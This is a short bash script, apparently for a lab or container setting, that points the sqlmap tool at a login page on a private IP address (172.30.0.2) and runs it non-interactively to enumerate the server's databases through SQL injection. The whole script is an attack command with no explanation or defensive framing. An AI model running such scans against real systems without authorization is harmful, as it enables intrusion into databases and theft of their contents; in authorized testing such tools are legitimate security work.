#!/bin/bash

TARGET_URL="http://172.30.0.2/login"

echo "[*] Attempting SQL Injection..."
sqlmap -u "$TARGET_URL" --batch --dbs
